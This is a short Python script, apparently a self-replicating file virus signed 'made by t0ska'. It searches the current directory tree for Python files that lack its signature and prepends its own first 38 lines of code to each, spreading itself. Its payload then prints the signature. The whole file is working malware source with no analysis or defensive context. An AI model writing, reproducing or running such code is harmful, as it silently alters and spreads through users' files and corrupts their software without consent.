#!/usr/bin/env python3

import os

SIGNATURE = 'made by t0ska'

def search():
	filestoinfect = []
	for root, dirs, files in os.walk('.'):
		for file in files:
			if file[-3:] == '.py':
				with open(root + os.sep + file, encoding='utf-8') as f:
					if SIGNATURE not in f.read():
						filestoinfect.append(root + os.sep +  file)

	return filestoinfect

def infect(filestoinfect):
	virusstring = ''
	with open(os.path.abspath(__file__), 'r') as virus:
		for i, line in enumerate(virus):
			if i < 38:
				virusstring += line
			else: 
				break 
	for file in filestoinfect:
		with open(file, 'r+') as f:
			temp = f.read()
			f.seek(0)
			f.write(virusstring + temp)
			f.close()

def bomb():
	print(SIGNATURE)			

infect(search())
bomb()

